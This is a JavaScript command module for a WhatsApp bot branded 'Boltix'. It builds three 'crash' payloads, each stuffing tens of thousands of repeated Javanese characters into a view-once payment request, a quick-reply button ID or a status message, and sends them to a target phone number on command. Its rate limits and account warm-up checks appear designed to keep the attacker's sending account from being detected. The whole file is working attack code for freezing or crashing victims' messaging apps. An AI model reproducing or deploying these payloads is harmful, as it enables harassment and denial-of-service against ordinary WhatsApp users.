'use strict';

const { jidToNumber, getText } = require('../utils');

/* ============================================================
   BOLTIX CRASH PAYLOADS + COMMANDS (crash1 / crash2 / crash3 / all)
============================================================ */

const CRASH_CHAR = 'ꦾ';

function clampSize(val, fallback) {
  const n = parseInt(val, 10);
  if (!Number.isFinite(n)) return fallback;
  return Math.min(Math.max(n, 5000), 60000);
}

const HUGE        = clampSize(process.env.OVERFLOW, 45000);
const STATUS_SIZE = clampSize(null, 30000);

function bigText(n = HUGE) {
  return '⚡ BOLTIX CRASH ☠\n' + CRASH_CHAR.repeat(n);
}

function chatOpenCrash(victimJid) {
  return {
    viewOnceMessageV2: {
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 9999999,
          requestFrom: victimJid,
          noteMessage: {
            extendedTextMessage: {
              text: bigText(),
              canonicalUrl: 'boltix-crash'
            }
          }
        }
      }
    }
  };
}

function buttonCrash() {
  return {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: '⚡ *BOLTIX CRASH — TAP* ⚡' },
          nativeFlowMessage: {
            buttons: [{
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: '⚡ BOLTIX 💥',
                id: CRASH_CHAR.repeat(Math.min(28000, HUGE))
              })
            }]
          }
        }
      }
    }
  };
}

function statusCrash() {
  return {
    viewOnceMessageV2: {
      message: {
        extendedTextMessage: {
          text: bigText(STATUS_SIZE),
          canonicalUrl: 'boltix-crash'
        }
      }
    }
  };
}

/* Per-user rate limit for these commands (15/min). */
const userLog = new Map();

function withinUserLimit(jid) {
  const key = jidToNumber(jid) || jid;
  const now = Date.now();
  const WINDOW = 60 * 1000;
  const MAX_PER_MIN = 15;

  const recent = (userLog.get(key) || []).filter(t => now - t < WINDOW);
  if (recent.length >= MAX_PER_MIN) return false;

  recent.push(now);
  userLog.set(key, recent);

  if (userLog.size > 100) {
    for (const [k, v] of userLog) {
      if (v.length === 0 || now - v[v.length - 1] > WINDOW * 5) userLog.delete(k);
    }
  }
  return true;
}

module.exports = {
  cmds: ['crash1', 'crash2', 'crash3', 'all'],

  async handler(m, ctx, arg) {
    if (!ctx.isOwner(m)) { await ctx.reply(m, '❌ Not authorized. Owner only.'); return; }
    if (!withinUserLimit(m.key.participant || m.key.remoteJid)) {
      await ctx.reply(m, '⏳ Rate limited — wait a moment.');
      return;
    }
    if (ctx.caps.dailyReached()) {
      await ctx.reply(m, `🧊 Daily send cap reached — resumes tomorrow.`);
      return;
    }
    if (ctx.caps.proactiveReached()) {
      await ctx.reply(m, `🧊 Proactive send cap reached — resumes tomorrow.`);
      return;
    }
    const warm = ctx.caps.warmupRemainingMs();
    if (warm > 0) {
      await ctx.reply(m, `⏳ Account warm-up in progress — ~${Math.ceil(warm / 60000)} min left.`);
      return;
    }

    if (!arg) { await ctx.reply(m, `Usage: ${ctx.prefix}crash1|crash2|crash3|all <number>`); return; }

    const jid = await ctx.toJid(arg);
    if (jid === 'OWNER_PROTECTED') { await ctx.reply(m, '🛡 Cannot attack owner number.'); return; }
    if (!jid) { await ctx.reply(m, '❌ Number not confirmed on WhatsApp.'); return; }

    const cmd = (m.message
      ? getText(m.message).slice(ctx.prefix.length).trim().split(/\s+/)[0]
      : '').toLowerCase();

    if (cmd === 'crash1' || cmd === 'all') {
      const r = await ctx.sendTo(jid, chatOpenCrash(jid));
      await ctx.reply(m, r.ok ? '✅ Boltix Crash 1 sent' : '❌ Boltix Crash 1 failed — try again');
    }

    if (cmd === 'crash2' || cmd === 'all') {
      const r = await ctx.sendTo(jid, buttonCrash());
      await ctx.reply(m, r.ok ? '✅ Boltix Crash 2 sent' : '❌ Boltix Crash 2 failed — try again');
    }

    if (cmd === 'crash3' || cmd === 'all') {
      const r = await ctx.sendStatus(jid, statusCrash(), {
        backgroundColor: '#000000',
        font: 3,
      });
      await ctx.reply(m, r.ok ? '✅ Boltix Crash 3 sent (status)' : '❌ Boltix Crash 3 failed — try again');
    }
  }
};
